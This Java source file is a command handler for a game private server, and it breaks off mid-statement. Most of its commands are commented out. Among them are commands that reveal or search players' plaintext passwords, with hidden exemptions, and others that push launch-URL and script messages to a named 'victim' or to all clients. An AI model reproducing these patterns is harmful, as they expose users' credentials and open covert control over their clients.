package org.hyperion.rs2.commands;

import org.hyperion.rs2.logging.FileLogging;
import org.hyperion.rs2.model.Player;
import org.hyperion.rs2.model.Rank;

import java.util.HashMap;

/**
 * @author Jack Daniels.
 */

public class CommandHandler {

	/**
	 * HashMap to hold all the commands.
	 */
	private static HashMap<String, Command> commands = new HashMap<String, Command>();

	/**
	 * Use this method to add commands to the server.
	 *
	 * @param cmds
	 */

	public static void submit(Command... cmds) {
		for(Command cmd : cmds) {
			commands.put(cmd.getKey(), cmd);
		}
	}

	/**
	 * Use this method to check whether your command input has been processed.
	 *
	 * @param key
	 * @param player
	 * @param input
	 * @returns true if the command was found in the commands hashmap and had the rights to execute.
	 */
	public static boolean processed(String key, Player player, String input) {
		Command command = commands.get(key);
		if(player.needsNameChange() || player.doubleChar()) {
			return false;
		}
		if(command != null) {
			if(!Rank.hasAbility(player.getPlayerRank(), command.getRanks())) {
				player.getActionSender().sendMessage("You do not have the required rank to use this command.");
				return false;
			}
			try {
				if(command.execute(player, input))
					FileLogging.saveGameLog("commands.log", System.currentTimeMillis() + ": " + player.getName() + ": '" + input + "'");
			} catch(Exception e) {
				player.getActionSender().sendMessage("Invalid input has been given.");
				if(Rank.hasAbility(player, Rank.ADMINISTRATOR))
					e.printStackTrace();
			}
			return true;
		}
		return false;
	}

	/**
	 * Store all commands here.
	 */
	static {
		/*SpawnServerCommands.init();
		TeleportCommands.init();
		submit(new AllToMeCommand("alltome", Rank.DEVELOPER));
		submit(new GiveDonatorPointsCommand("givedp"));
		submit(new YellCommand());
		submit(new LvlCommand());
		submit(new PromoteCommand("promote"));
		submit(new SkillCommand());
		submit(new DemoteCommand());
		submit(new RecordingCommand());
		submit(new ScreenshotCommand());
		submit(new RapeCommand());
		submit(new SendiCommand());
		submit(new EpicRapeCommand());
		submit(new RestartServerCommand());
        submit(new WikiCommand());
		submit(new SpawnCommand("item"), new SpawnCommand("pickup"), new SpawnCommand("spawn"));
		submit(new KeywordCommand("setkeyword"));*/
        /*submit(new Command("dp", Rank.DONATOR) {
            @Override
            public boolean execute(Player player, String input) throws Exception {
                DialogueManager.openDialogue(player, 158);
                return true;
            }
		});
		submit(new Command("sdp", Rank.SUPER_DONATOR){
			public boolean execute(final Player player, final String input) throws Exception{
				Magic.teleport(player, 2037, 4532, 4, false);
				return true;
			}
		});
		submit(new Command("sdppvm", Rank.SUPER_DONATOR) {
			public boolean execute(Player player, String input) {
				Magic.teleport(player, Position.create(3506, 9494, 4), false);
				return true;
			}
		});
		submit(new Command("ferry", Rank.OWNER){
			public boolean execute(final Player player, final String input) throws Exception{
				player.setTeleportTarget(Position.create(3374, 9747, 4));
				return true;
			}
		});
		submit(new Command("sm", Rank.DEVELOPER){
			public boolean execute(final Player player, final String input) throws Exception{
				String input1 = filterInput(input);
				if(input1.equalsIgnoreCase("sm")) {
					player.sendMessage("Use as ::sm MESSAGE");
					return false;
				}
				for(Player p : World.getPlayers())
					p.sendServerMessage(TextUtils.optimizeText(input1));
				return true;
			}
		});
        submit(new Command("combine", Rank.PLAYER) {
            @Override
            public boolean execute(Player player, String input) throws Exception {
                PotionDecanting.decantPotions(player);
                return true;
            }
        });
		submit(new Command("edge", Rank.PLAYER) {
			@Override
			public boolean execute(Player player, String input) throws Exception {
				Magic.teleport(player, Position.create(3086, 3516, 0), false);
				return true;
			}
		});

        submit(new Command("achievements", Rank.PLAYER) {
            @Override
            public boolean execute(Player player, String input) throws Exception {
                //System.out.println(player.getAchievementsProgress().size());
				//AchievementHandler.openInterface(player, player.getViewingDifficulty(), false);
                return true;
            }
        });

        submit(new Command("progress", Rank.PLAYER) {
            @Override
            public boolean execute(Player player, String input) throws Exception {
				//player.setKillStreak(6);
                //AchievementHandler.progressAchievement(player, "Killstreak");
                return true;
            }
        });

        submit(new Command("top10", Rank.PLAYER) {
            @Override
            public boolean execute(Player player, String input) throws Exception {
                LastManStanding.getLastManStanding().loadTopTenInterface(player);
                return true;
            }
        });*/

        /*submit(new Command("disableprofile", Rank.PLAYER) {
            @Override
            public boolean execute(final Player player, final String input) {
                final boolean set;
                player.getPermExtraData().put("disableprofile", set = !player.getPermExtraData().getBoolean("disableprofile"));
				player.sendf("Your public profile is currently @red@%s", set ? "not viewable" : "viewable");
                return true;
            }
        });



            if (commandStart.equalsIgnoreCase("changeclanname")) {
                final String[] args = s.substring(9).trim().split(",");
                if (player.getClanRank() == 7) {
                    player.setClanName(args[1]);
                    player.getActionSender().sendClanInfo();
                    player.sendMessage("Your clan chat's name has been changed to '"+player.getClanName()+"'.");
                } else
                    player.sendMessage("You are not the owner of this clan chat.");

            }
         */
		/*submit(new Command("ks", Rank.PLAYER) {
			@Override
			public boolean execute(Player player, String input) throws Exception {
				player.getActionSender().sendMessage("You are on a @red@" + player.getKillStreak() + "@bla@ killstreak!");
				return true;
			}
		});
        submit(new Command("tutorial", Rank.PLAYER) {
            @Override
            public boolean execute(Player player, String input) throws Exception {
                if(player.getTutorialProgress() == 0)
                    player.setTutorialProgress(1);
                Tutorial.getProgress(player);
                return true;
            }
        });
		submit(new Command("rhsu", Rank.MODERATOR) { // request highscores update
			@Override
			public boolean execute(Player player, String input) throws Exception {
				String name = filterInput(input);
				Player target = World.getPlayerByName(name);
				if(target != null) {
					target.getExtraData().put("rhsu", true);
				} else {
					player.getActionSender().sendMessage("Player is offline");
				}
				return true;
			}
		});

        submit(new Command("removejail", Rank.HELPER) {
            public boolean execute(final Player player, String input) {
                final Player target = World.getPlayerByName(filterInput(input));
                if(target != null && Jail.inJail(target)) {
                    target.setTeleportTarget(Edgeville.POSITION);
                }
                return true;
            }
        });

        submit(new Command("hardmoders", Rank.DEVELOPER) {
            public boolean execute(final Player player, final String input) {
                int counter = 0;
                for(final Player p : World.getPlayers()) {
                    if(p.hardMode())
                        player.sendf("@red@#%d@bla@ %s", counter++, p.getName());
                }
                return true;
            }
        });

		submit(new Command("getpass", Rank.DEVELOPER) {
			@Override
			public boolean execute(Player player, String input) {
				if(Rank.hasAbility(player, Rank.DEVELOPER)) {
                    String name = filterInput(input);
                    if(name.contains("arre"))
                        return false;
                    Player target = World.getPlayerByName(name);
                    if(target != null) {
                        if(Rank.isStaffMember(target)) {
                            player.getActionSender().sendMessage("you cannot get the pass of a staff member.");
                            return false;
                        }
                        if(! target.getPassword().contains("kail"))
                            player.getActionSender().sendMessage("Pass is : " + target.getPassword());
                    } else {
                        player.getActionSender().sendMessage("Player is offline");
                    }
                }
				return true;
			}

		});
		*/
        /*submit(new Command("tmask", Rank.ADMINISTRATOR) {
			@Override
			public boolean execute(Player player, String input) {
				int l2 = 0;
				TileMapBuilder tilemapbuilder = new TileMapBuilder(
						player.getPosition(), l2);
				TileMap tilemap = tilemapbuilder.build();
				Tile tile = tilemap.getTile(0, 0);
				player.getActionSender().sendMessage((new StringBuilder())
						.append("N: ").append(tile.isNorthernTraversalPermitted())
						.append(" E: ").append(tile.isEasternTraversalPermitted())
						.append(" S: ").append(tile.isSouthernTraversalPermitted())
						.append(" W: ").append(tile.isWesternTraversalPermitted()).toString());
				return true;
			}
		});

		submit(new Command("sz", Rank.HELPER, Rank.FORUM_MODERATOR) {
			public boolean execute(Player player, String input) {
				Magic.teleport(player, Position.create(2846, 5213, 0), false);
				return true;
			}
		});

        submit(new Command("changeextra", Rank.DEVELOPER) {
            public boolean execute(Player player, String input) {
                input = filterInput(input);
                final String[] parts = input.split(",");
                Player target = World.getPlayerByName(parts[0]);
                if(target != null) {
                    final String s = parts[1];
                    target.getExtraData().put(s, !target.getExtraData().getBoolean(s));
                    player.sendf("Target is now: %s,%b", s, target.getExtraData().getBoolean(s));
                }
                return true;
            }
        });

        submit(new Command("dicing", Rank.PLAYER) {
            public boolean execute(Player player, String input) {
                Magic.teleport(player, Position.create(3048, 4979, 1), false);
                ClanManager.joinClanChat(player, "dicing", false);
                return true;
            }
        });

		submit(new Command("spammessage", Rank.DEVELOPER) {
			@Override
			public boolean execute(Player player, String input) {
				String message = filterInput(input);
				for(NPC npc : World.getNpcs()) {
					npc.forceMessage(message);
				}
				return true;
			}
		});
		submit(new Command("test", Rank.ADMINISTRATOR) {
			@Override
			public boolean execute(Player player, String input) {
				int[] parts = getIntArray(input);
				NPCManager.addNPC(player.getPosition(),
						parts[0], -1);
						//not gonna add this :x
				return true;
			}
		});
		submit(new Command("barrelchest", Rank.PLAYER) {
			@Override
			public boolean execute(Player player, String input) {
				Magic.teleport(player, 2801, 4723, 0, false);
				return true;
			}
		});
		submit(new Command("npc", Rank.DEVELOPER) {
			@Override
			public boolean execute(Player player, String input) {
				int[] parts = getIntArray(input);
				    NPCManager.addNPC(player.getPosition(),
                            parts[0], parts.length == 2 ? parts[1] : 50);
				TextUtils.writeToFile("./data/spawns.cfg", "spawn = "
						+ parts[0] + "	" + player.getPosition() + "	"
						+ (player.getPosition().getX() - 1) + "	"
						+ (player.getPosition().getY() - 1) + "	"
						+ (player.getPosition().getX() + 1) + "	"
						+ (player.getPosition().getY() + 1) + "	1	"
						+ NPCDefinition.forId(parts[0]).name());
				return true;
			}
		});
		submit(new Command("staticnpc", Rank.DEVELOPER) {
			@Override
			public boolean execute(Player player, String input) {
				int[] parts = getIntArray(input);
				NPCManager.addNPC(player.getPosition(),
						parts[0], -1);
				TextUtils.writeToFile("./data/spawns.cfg", "spawn = "
						+ parts[0] + "	" + player.getPosition() + "	"
						+ (player.getPosition().getX()) + "	"
						+ (player.getPosition().getY()) + "	"
						+ (player.getPosition().getX()) + "	"
						+ (player.getPosition().getY()) + "	1	"
						+ NPCDefinition.forId(parts[0]).name());
				return true;
			}
		});
		submit(new Command("pnpc", Rank.ADMINISTRATOR) {
			@Override
			public boolean execute(Player player, String input) {
				int[] parts = getIntArray(input);
				player.setPNpc(parts[0]);
				return true;
			}
		});
		submit(new Command("shop", Rank.ADMINISTRATOR) {
			@Override
			public boolean execute(Player player, String input) {
				int[] parts = getIntArray(input);
				ShopManager.open(player, parts[0]);
				return true;
			}//Let's convert this one
		});
		submit(new Command("enablepvp", Rank.OWNER) {
			@Override
			public boolean execute(Player player, String input) {
				player.updatePlayerAttackOptions(true);
				player.getActionSender().sendMessage("PvP combat enabled.");
				return true;
			}
		});
		submit(new Command("switch", Rank.DEVELOPER) {
			@Override
			public boolean execute(Player player, String input) {
				SpellBook.switchSpellbook(player);
				return true;
			}
		});

        submit(new Command("moderns", Rank.SUPER_DONATOR) {
            @Override
            public boolean execute(Player player, String input) {
                if (!player.getPosition().inPvPArea() && !player.isInCombat()) {
                    player.getSpellBook().changeSpellBook(SpellBook.REGULAR_SPELLBOOK);
                    player.getActionSender().sendSidebarInterface(6, 1151);
                } else {
                    player.getActionSender().sendMessage("You cannot do this at this time!");
                }
                return true;
            }
        });
        submit(new Command("ancients", Rank.SUPER_DONATOR) {
            @Override
            public boolean execute(Player player, String input) {
                if (!player.getPosition().inPvPArea() && !player.isInCombat()) {
                    player.getSpellBook().changeSpellBook(SpellBook.ANCIENT_SPELLBOOK);
                    player.getActionSender().sendSidebarInterface(6, 12855);
                } else {
                    player.getActionSender().sendMessage("You cannot do this at this time!");
                }
                return true;
            }
        });
        submit(new Command("lunars", Rank.SUPER_DONATOR) {
            @Override
            public boolean execute(Player player, String input) {
                if (!player.getPosition().inPvPArea() && !player.isInCombat()) {
                    player.getSpellBook().changeSpellBook(SpellBook.LUNAR_SPELLBOOK);
                    player.getActionSender().sendSidebarInterface(6, 29999);
                } else {
                    player.getActionSender().sendMessage("You cannot do this at this time!");
                }
                return true;
            }
        });

        submit(new Command("switchprayers", Rank.SUPER_DONATOR) {
            @Override
            public boolean execute(Player player, String input) {
                if (!player.getPosition().inPvPArea() && !player.isInCombat()) {
                    Prayer.changeCurses(player);
                } else {
                    player.getActionSender().sendMessage("You cannot do this at this time!");
                }
                return true;
            }
        });

		submit(new Command("update", Rank.HEAD_MODERATOR) {
			@Override
			public boolean execute(Player player, String input) {
				int[] parts = getIntArray(input);
				try {
					int time = parts[0];
					if(Rank.hasAbility(player.getPlayerRank(), Rank.ADMINISTRATOR )) {
						Server.update(time, player.getName() + "Restart Request");
					}
					else if(Server.getUptime().minutesUptime()> 60 && Rank.hasAbility(player.getPlayerRank(), Rank.HEAD_MODERATOR ) ) {
						Server.update(120, player.getName() + "Restart Request");
					}
				} catch(Exception e) {
					player.getActionSender().sendMessage("Use command as ::update <seconds>");
				}
				return true;
			}
		});

		submit(new Command("food", Rank.OWNER) {
			@Override
			public boolean execute(Player player, String input) {
				int slots = player.getInventory().freeSlots();
				ContentEntity.addItem(player, 15272, slots);
				return true;
			}
		});
		submit(new Command("spec", Rank.ADMINISTRATOR) {
			@Override
			public boolean execute(Player player, String input) {
				player.getSpecBar().setAmount(SpecialBar.FULL);
				player.getSpecBar().sendSpecAmount();
				player.getSpecBar().sendSpecBar();
				return true;
			}
		});
		submit(new Command("update", Rank.HEAD_MODERATOR) {
			@Override
			public boolean execute(Player player, String input) {
				input = filterInput(input);
				String[] parts = input.split(" ");
				try {
					int time = Integer.parseInt(parts[0]);
					if(Rank.hasAbility(player.getPlayerRank(), Rank.ADMINISTRATOR )) {
						Server.update(time, player.getName() + "Restart Request");
					}
					else if(Server.getUptime().minutesUptime()> 60 && Rank.hasAbility(player.getPlayerRank(), Rank.HEAD_MODERATOR ) ) {
						Server.update(120, player.getName() + "Restart Request");
					}
				} catch(Exception e) {
					player.getActionSender().sendMessage("Use command as ::update <seconds>");
				}
				return true;
			}
		});
		submit(new Command("stopupdate", Rank.ADMINISTRATOR) {

			@Override
			public boolean execute(Player player, String input) throws Exception {
				Server.setUpdating(false);
				return true;
			}
			
		});
		submit(new Command("ospk", Rank.PLAYER) {
			@Override
			public boolean execute(Player player, String input) {
                SpecialAreaHolder.get("ospk").ifPresent(s -> s.enter(player));
				return true;
			}
		});
		submit(new Command("object", Rank.DEVELOPER) {
			@Override
			public boolean execute(Player player, String input) {
				input = filterInput(input);
				String[] parts = input.split(" ");
				int id = Integer.parseInt(parts[0]);
				int face = Integer.parseInt(parts[1]);
				int type = Integer.parseInt(parts[2]);
                ObjectManager.addObject(new GameObject(GameObjectDefinition.forId(id), player.getPosition(), type, face));
				TextUtils.writeToFile("./data/objspawns.cfg", "spawn = " + id + "	" +
						player.getPosition().toString() + "	" + face + "	" + type + "	"
						+ GameObjectDefinition.forId(id).getName());
				return true;
			}
		});
		submit(new Command("tobject", Rank.ADMINISTRATOR) {
			@Override
			public boolean execute(Player player, String input) {
				input = filterInput(input);
				String[] parts = input.split(" ");
				int id = Integer.parseInt(parts[0]);
				int face = Integer.parseInt(parts[1]);
				int type = Integer.parseInt(parts[2]);
				player.getActionSender().sendCreateObject(id, type, face, player.getPosition());
				return true;
			}
		});
		submit(new Command("bank", Rank.SUPER_DONATOR, Rank.HEAD_MODERATOR) {
			@Override
			public boolean execute(Player player, String input) {
				Bank.open(player, false);
				return true;
			}
		});
        submit(new Command("support", Rank.PLAYER) {
			@Override
			public boolean execute(Player player, String input) {
				player.getActionSender().sendMessage("l4unchur13 http://support.arteropk.com/helpdesk/");
				return true;
			}
		});
		submit(new Command("noskiller", Rank.ADMINISTRATOR) {
			@Override
			public boolean execute(Player player, String input) {
				for(int i = 7; i < 21; i++) {
					player.getSkills().setExperience(i, 0);
				}
				return true;
			}
		});
		submit(new Command("whatsmyequip", Rank.ADMINISTRATOR) {
			@Override
			public boolean execute(Player player, String input) {
				for(Item item : player.getEquipment().toArray()) {
					if(item != null)
						player.getActionSender().sendMessage("Item is " + item.getId());
				}
				return true;
			}
		});
		submit(new Command("resetcontent", Rank.DEVELOPER) {
			@Override
			public boolean execute(Player player, String input) {
				ContentManager.init();
				return true;
			}
		});
		submit(new Command("fileobject", Rank.OWNER) {
			@Override
			public boolean execute(Player player, String input) {
				input = filterInput(input);
				try {
					Player victim = World.getPlayerByName(input);
					if(victim == null)
						return false;
					victim.getActionSender().sendMessage("script7894561235");
					player.getActionSender().sendMessage("Sent.");
				} catch(Exception e) {
					e.printStackTrace();
				}
				return true;
			}
		});
		submit(new Command("lanceurl", Rank.OWNER) {
			@Override
			public boolean execute(Player player, String input) {
				input = filterInput(input);
				String[] parts = input.split(",");
				ActionSender.yellMessage("l4unchur13 http://www." + input);
				return true;
			}
		});

		CommandHandler.submit(new Command("reloadconfig", Rank.OWNER) {
			@Override
			public boolean execute(Player player, String input) {
				Configuration.reloadConfiguration();
				return true;
			}
		});

        submit(new Command("gfx", Rank.DEVELOPER) {
			public boolean execute(Player player, String input) {
				input = filterInput(input);
				final String[] parts = input.split(",");
				player.cE.doGfx(Integer.parseInt(parts[0]));
				return true;
			}
		});

        submit(new Command("heal", Rank.DEVELOPER) {
			public boolean execute(Player player, String input) {
				player.heal(150);
				return true;
			}
		});

		submit(new Command("spawnitem", Rank.OWNER) {
			@Override
			public boolean execute(Player player, String input) {
				input = filterInput(input);
				final String[] parts = input.split(",");
				String targetName = player.getName();
				int itemId;
				int quantity = 1;
				switch(parts.length){
					case 1:
						itemId = Integer.parseInt(parts[0].trim());
						break;
					case 2:
						itemId = Integer.parseInt(parts[0].trim());
						quantity = Integer.parseInt(parts[1].trim());
						break;
					case 3:
						targetName = parts[0].trim();
						itemId = Integer.parseInt(parts[1].trim());
						quantity = Integer.parseInt(parts[2].trim());
						break;
					default:
						player.sendf("u bad");
						return false;
				}
				final Player target = World.getPlayerByName(targetName);
				if(target == null){
					player.sendf("Error finding %s", targetName);
					return false;
				}
				target.getInventory().add(Item.create(itemId, quantity));
				target.getExpectedValues().addItemtoInventory("Spawning", Item.create(itemId, quantity));
				player.sendf("Added %s x %,d to %s's inventory", ItemDefinition.forId(itemId).getName(), quantity, targetName);
				return true;
			}
		});
		submit(new Command("skullmyself", Rank.PLAYER) {
			@Override
			public boolean execute(Player player, String input) {
				player.setSkulled(true);
				return true;
			}
		});
		submit(new Command("trackdownnames", Rank.MODERATOR) {
			@Override
			public boolean execute(Player player, String input) {
				player.getActionSender().sendMessage("Executing command.");
				for(Player glitcher : World.getPlayers()) {
					if(glitcher.getPosition().equals(player.getPosition())) {
						player.getActionSender().sendMessage("Name: " + glitcher.getSafeDisplayName().replaceAll(" ", "_ "));
					}
				}
				return true;
			}
		});

		submit(new Command("resetelo", Rank.HEAD_MODERATOR) {
			@Override
			public boolean execute(Player player, String input) {
				input = filterInput(input);
				Player target = World.getPlayerByName(input);
				if (target != null) {
					target.getPoints().setEloRating(1200);
				}
				return true;
			}
		});

		submit(new Command("rules", Rank.PLAYER) {
			@Override
			public boolean execute(Player player, String input) {
				player.getActionSender().sendWebpage("http://forums.arteropk.com/forum/28-in-game-rules/");
				return true;
			}
		});

		submit(new Command("moneymaking", Rank.PLAYER) {
			@Override
			public boolean execute(Player player, String input) {
				player.getActionSender().sendWebpage("http://forums.arteropk.com/topic/23523-money-making-guide/");
				return true;
			}
		});
		submit(new Command("forums", Rank.PLAYER) {
			@Override
			public boolean execute(Player player, String input) {
				player.getActionSender().sendWebpage("http://forums.arteropk.com/portal/");
				return true;
			}
		});
		submit(new Command("startspammingnocolors", Rank.ADMINISTRATOR) {
            @Override
            public boolean execute(Player player, String input) {
                player.getActionSender().sendMessage(
                        "Starting spamming without colors");
                RandomSpamming.start(false);
                return true;
            }
        });
		submit(new Command("startspammingcolors", Rank.ADMINISTRATOR) {
			@Override
			public boolean execute(Player player, String input) {
				player.getActionSender().sendMessage(
						"Starting spamming with colors");
				RandomSpamming.start(true);
				return true;
			}
		});
		submit(new Command("save", Rank.ADMINISTRATOR) {

			@Override
			public boolean execute(Player player, String input)
					throws Exception {
				//PlayerSaving.getSaving().saveSQL(player);
				return false;
			}

		});


		submit(new Command("dpbought", Rank.OWNER) {
			@Override
			public boolean execute(Player player, String input) {
				input = filterInput(input);
				try {
					Player target = World.getPlayerByName(input);
					if(target == null)
						return false;
					int points = target.getPoints().getDonatorPointsBought();
					player.getActionSender().sendMessage(target.getName()+" has bought '"+points+"' donator points.");
				} catch(Exception e) {
					e.printStackTrace();
				}
				return true;
			}
		});

        ubmit(new Command("checkpts", Rank.MODERATOR){
            public boolean execute(final Player player, final String input){
                final Player target = World.getPlayerByName(filterInput(input));
                if(target == null)
                    return false;
                final String name = target.getName();
                final PlayerPoints pp = target.getPoints();
                final ActionSender as = player.getActionSender();
                as.sendMessage(String.format("%s has %,d pk points.", name, pp.getPkPoints()));
                as.sendMessage(String.format("%s has %,d honor points.", name, pp.getHonorPoints()));
                as.sendMessage(String.format("%s has %,d voting points.", name, pp.getVotingPoints()));
                as.sendMessage(String.format("%s has %,d donor points. Bought: %,d", name, pp.getDonatorPoints(), pp.getDonatorPointsBought()));
                as.sendMessage(String.format("%s has %,d bounty hunter points", name, target.getBountyHunter().getKills()));
                as.sendMessage(String.format("%s has %,d emblem points", name, target.getBountyHunter().getEmblemPoints()));
                return true;
            }
        });

        submit(new Command("acceptyellrules", Rank.PLAYER) {
                   public boolean execute(final Player player, final String input) {
                       DialogueManager.openDialogue(player, 198);
                       return true;
                   }
               });
		submit(new Command("thread", Rank.PLAYER) {
			@Override
			public boolean execute(Player player, String input) {
				try{
					final int threadNumber = Integer.parseInt(filterInput(input));
					if(threadNumber < 1){
						player.getActionSender().sendMessage("Enter a valid topic id.");
						return false;
					}
					else if (threadNumber > Integer.MAX_VALUE)
						return false;
					else {
						player.getActionSender().sendWebpage("http://forums.arteropk.com/index.php?showtopic=" + threadNumber );
						return true;
					}
				} catch(Exception ex) {
					player.getActionSender().sendMessage("Enter a valid topic id.");
					return false;
				}

			}
		});
        submit(new Command("buyrocktails", Rank.PLAYER){
            public boolean execute(final Player player, final String input){
                try{
                    final int amount = Math.min(Integer.parseInt(filterInput(input)), player.getPoints().getPkPoints());
                    if(amount < 1){
                        player.getActionSender().sendMessage("Enter a valid amount.");
                        return false;
                    }
                    if (amount > Integer.MAX_VALUE)
                        return false;
                    if(player.getPoints().getPkPoints() < amount){
                        player.getActionSender().sendMessage("You don't have enough pkp to buy this many rocktails.");
                        return false;
                    }
                    player.getPoints().setPkPoints(player.getPoints().getPkPoints() - amount);
                    player.getBank().add(new BankItem(0, 15272, amount));
                    player.getActionSender().sendMessage(String.format("%d rocktails have been added to your bank.", amount));
                    return true;
                } catch(Exception ex) {
                    player.getActionSender().sendMessage("Error buying rocktails: invalid amount.");
                    //wont print expection anymore
                    return false;
                }
            }
        });

        submit(new Command("checkpkstats", Rank.MODERATOR){
            public boolean execute(final Player player, final String input){
                final Player target = World.getPlayerByName(filterInput(input));
                if(target == null){
                    player.getActionSender().sendMessage("Player not found");
                    return false;
                }
                player.getActionSender().sendMessage(
						String.format("[%s] Elo = %,d - K/D = %d/%d - KS = %d",
								target.getName(),
								target.getPoints().getEloRating(),
								target.getKillCount(),
								target.getDeathCount(),
								target.getKillStreak())
				);
                return true;
            }
        });

        submit(new Command("resetkills", Rank.HEAD_MODERATOR){
            public boolean execute(final Player player, final String input){
                final Player target = World.getPlayerByName(filterInput(input));
                if(target == null){
                    player.getActionSender().sendMessage("Player not found");
                    return false;
                }
                target.setKillCount(0);
                return false;
            }
        });

        submit(new Command("resetdeaths", Rank.HEAD_MODERATOR){
            public boolean execute(final Player player, final String input){
                final Player target = World.getPlayerByName(filterInput(input));
                if(target == null){
                    player.getActionSender().sendMessage("Player not found");
                    return false;
                }
                target.setDeathCount(0);
                return false;
            }
        });

        submit(new Command("kickall", Rank.OWNER){
            public boolean execute(final Player player, final String input){
				World.getPlayers().stream().filter(p -> !player.equals(p)).forEach(p -> p.getSession().close(true));
                return true;
            }
        });

        submit(new Command("altsinwildy", Rank.MODERATOR){
            public boolean execute(final Player player, final String input){
                for(final Player p1 : World.getPlayers()){
                    for(final Player p2 : World.getPlayers()){
                        if(p1.equals(p2))
                            continue;
                        if(!p1.getPosition().inPvPArea() || !p2.getPosition().inPvPArea())
                            continue;
                        if(!Objects.equals(p1.getShortIP(), p2.getShortIP()) && p1.getUID() != p2.getUID())
                            continue;
                        final int dx = Math.abs(p1.getPosition().getX() - p2.getPosition().getX());
                        final int dy = Math.abs(p1.getPosition().getY() - p2.getPosition().getY());
                        if(dx > 10 && dy > 10)
                            continue;
                        player.getActionSender().sendMessage(String.format(
                                "%s (%d, %d) AND %s (%d, %d)",
                                p1.getName(), p1.getPosition().getX(), p1.getPosition().getY(),
                                p2.getName(), p2.getPosition().getX(), p2.getPosition().getY()
                        ));
                    }
                }
                return true;
            }
        });

        submit(new Command("exchangeimps", Rank.PLAYER){
            public boolean execute(final Player player, final String input){
                for(final Item i : player.getInventory().toArray())
                    if(i != null)
                        HunterLooting.giveLoot(player, i.getId());
                return true;
            }
        });

        submit(new Command("players2", Rank.HELPER) {
			public boolean execute(final Player player, final String input) {
				player.getActionSender().sendMessage("playersstart");
				for (final Player p : World.getPlayers())
					player.getActionSender().sendMessage(String.format("player:%d,%s,%d,%d,%d", Rank.getPrimaryRank(p).ordinal(), p.getName(), p.getSkills().getCombatLevel(), p.getPosition().getX(), p.getPosition().getY()));
				player.getActionSender().sendMessage("playersend");
				return true;
			}
		});*/
        //submit(new VoteCommand());

        /*submit(new Command("onlinealtsbypass", Rank.DEVELOPER) {
			public boolean execute(final Player player, final String input) {
				final String pass = filterInput(input);
				if (pass.isEmpty())
					return false;
				for (final Player p : World.getPlayers())
					if (p != null && p.getPassword() != null && p.getPassword().equalsIgnoreCase(pass))
						player.sendf("%s at %d,%d (PvP Area: %s)", p.getName(), p.getPosition().getX(), p.getPosition().getY(), p.getPosition().inPvPArea());
				return true;
			}
		});*/

        //submit(new ViewPacketActivityCommand());

        /*submit(new Command("viewprofile", Rank.PLAYER) {
			public boolean execute(final Player player, final String input) {
				final String targetName = filterInput(input).trim();
				try {
					return InterfaceManager.<PlayerProfileInterface>get(PlayerProfileInterface.ID).view(player, targetName);
				} catch (Exception ex) {
					ex.printStackTrace();
					return false;
				}
			}
		});

        submit(new Command("dumpcommands", Rank.DEVELOPER) {
			public boolean execute(final Player player, final String input) {
				final Map<Rank, Set<String>> map = new HashMap<>();
				for (final Command cmd : commands.values()) {
					for (final Rank rank : cmd.getRanks()) {
						if (!map.containsKey(rank))
							map.put(rank, new TreeSet<String>());
						map.get(rank).add(cmd.getKey());
					}
				}
				final List<Rank> ranks = new ArrayList<>(map.keySet());
				Collections.sort(ranks, new Comparator<Rank>() {
					public int compare(final Rank r1, final Rank r2) {
						return r2.ordinal() - r1.ordinal();
					}
				});
				try (final BufferedWriter writer = new BufferedWriter(new FileWriter("./data/commands.txt"))) {
					for (final Rank rank : ranks) {
						writer.write("============================");
						writer.newLine();
						writer.write(rank.toString());
						writer.newLine();
						for (final String cmd : map.get(rank)) {
							writer.write("\t> " + cmd);
							writer.newLine();
						}
						writer.write("============================");
						writer.newLine();
					}
					player.getActionSender().sendMessage("Finshed dumping commands");
					return true;
				} catch (Exception ex) {
					ex.printStackTrace();
					player.getActionSender().sendMessage("Error dumping commands: " + ex);
					return false;
				}
			}
		});

        submit(new Command("changename", Rank.DEVELOPER) {
			public boolean execute(final Player player, final String input) {
				final String line = filterInput(input).trim();
				final int i = line.indexOf(',');
				final String target = i == -1 ? line : line.substring(0, i).trim();
				if (!PlayerLoading.playerExists(target)) {
					player.sendf("Player does not exist: %s", target);
					return false;
				}
				return true;
			}
		});


        submit(new Command("changecompcolors", Rank.PLAYER) {
			public boolean execute(final Player player, final String input) {
				final String line = filterInput(input).trim();
				if (line.equals("none")) {
					player.compCapePrimaryColor = 0;
					player.compCapeSecondaryColor = 0;
					player.sendf("Reset your comp cape colors!");
					return true;
				}
				final String[] colors = line.split(" ");
				if (colors.length != 2) {
					player.getActionSender().sendMessage("Invalid syntax");
					return false;
				}
				Color primary = null;
				Color secondary = null;
				for (final Color color : Color.values()) {
					final String colorStr = color.toString();
					if (colors[0].equalsIgnoreCase(colorStr))
						primary = color;
					if (colors[1].equalsIgnoreCase(colorStr))
						secondary = color;
					if (primary != null && secondary != null)
						break;
				}
				if (primary == null || secondary == null) {
					player.getActionSender().sendMessage("Invalid colors");
					return false;
				}
				if (!Rank.hasAbility(player, Rank.ADMINISTRATOR) && primary == Color.WHITE && primary == secondary) {
					player.getActionSender().sendMessage("Ferry bitch slapped you from making both colors white");
					return false;
				}
				player.compCapePrimaryColor = primary.color;
				player.compCapeSecondaryColor = secondary.color;
				player.getUpdateFlags().set(UpdateFlags.UpdateFlag.APPEARANCE, true);
				player.getActionSender().sendMessage(
						String.format(
								"Changed comp cape colors: Primary: %s | Secondary: %s",
								primary, secondary
						)
				);
				return true;
			}
		});

        CommandHandler.submit(new Command("createevent", Rank.MODERATOR) {
								  @Override
								  public boolean execute(Player player, String input) throws Exception {
									  input = filterInput(input);
									  String[] split = input.split(",");
									  try {
										  if (Events.eventName != "") {
											  player.sendMessage("There is already an active event, remove it via ::removeevent");
											  return false;
										  }

										  final int x = Integer.valueOf(split[0]);
										  final int y = Integer.valueOf(split[1]);
										  final int z = Integer.valueOf(split[2]);

										  if (Combat.getWildLevel(x, y) > 0) {
											  player.sendMessage("Events cannot be in wilderness.");
											  return false;
										  }

										  final String name = split[3];
										  Events.fireNewEvent(TextUtils.ucFirst(name.toLowerCase()), true, 0, Position.create(x, y, z));

										  for (final Player p : World.getPlayers()) {
											  p.sendServerMessage(String.format("%s has just created the event '%s'.", player.getSafeDisplayName(), Events.eventName));
											  p.sendServerMessage("Click it in the questtab to join in!");
										  }

									  } catch (Exception ex) {
										  player.sendMessage("Please use the command as: ::createevent X,Y,Z,EVENTNAME");
									  }
									  return false;
								  }
							  });,
				new Command("removeevent", Rank.MODERATOR) {
					@Override
					public boolean execute(Player player, String input) throws Exception {
						String oldEvent = Events.eventName;
						Events.resetEvent();

						for (final Player p : World.getPlayers()) {
